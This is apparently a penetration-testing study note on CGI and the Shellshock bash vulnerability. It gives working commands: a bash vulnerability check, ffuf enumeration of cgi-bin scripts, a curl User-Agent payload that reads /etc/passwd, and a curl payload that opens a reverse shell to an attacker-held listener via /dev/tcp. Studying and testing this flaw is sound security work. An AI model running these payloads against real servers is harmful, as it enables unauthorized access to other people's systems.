---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: CGI
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]

#### *Theory*

![[CGI-20260402134429176.webp|350]]

> ***Zoom in***

#### *Shellshock ( CVE-2014-{6271,7169} )*

> ***[CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)***

> ***See also [CVE-2014-7169](https://nvd.nist.gov/vuln/detail/cve-2014-7169)***

> ***Affected Versions → Bash 4.3 and lower***

This vulnerability can be used to run arbitrary system commands using environment variables

That is, in vulnerable *[[BASH|bash]]* versions, attackers are able to run system commands that are include after a function stored inside a environment variable 

```bash
env y='() { :; } ; echo vulnerable' bash -c 'echo not vulnerable'
```

In this case, we run the *env* binary to inject a environment parameter within an specific process, namely a new bash instance

If the bash instance is launched by running a *bash* binary whose version corresponds to the *4.3* or lower, it will inspect existing environment parameters; If it is vulnerable, it will import the malicious parameter as a function and execute whatever follows the function definition

###### *Via CGI*

- ***Enumeration***

Having verified that a */cgi-bin* directory exists, we can fuzz for existing *CGI* scripts

To do so, we will use ***[Ffuf](https://github.com/ffuf/ffuf)*** and ***[this wordlist](https://github.com/v0re/dirb/blob/master/wordlists/small.txt)***

```bash
ffuf -v -t 200 -w '/usr/share/dirb/wordlists/small.txt' -u '<URL>/cgi-bin/FUZZ.cgi'
```

- ***Verifying if the target is vulnerable***

Once we have discovered an existing *CGI* script, we can send an *HTTP* request containing the following payload within the *User-Agent* header

```bash
curl --silent --location --request GET --header 'User-Agent: () { : ; } ; echo ; echo ; /bin/cat /etc/passwd' '<URL>/cgi-bin/<RESOURCE>.cgi'
```

If we get the content of the given file within the *HTTP* response, then it is vulnerable

So, we can proceed as follows to establish a remote connection to the target through a reverse shell

- ***Getting a Reverse Shell***

***Setting a TCP Listener***

```bash
nc -nlvp 443
```

***Receiving the Reverse Shell***

```bash
curl --silent --location --request GET --header 'User-Agent: () { : ; } ; /bin/bash -i &> /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' '<URL>/cgi-bin/<RESOURCE>.cgi'
```

##### *Resources*

***[Cloudflare: Inside-Shellshock](https://blog.cloudflare.com/inside-shellshock/)***

***[Digital Ocean: How to protect your server against the ShellSock vulnerability](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability)***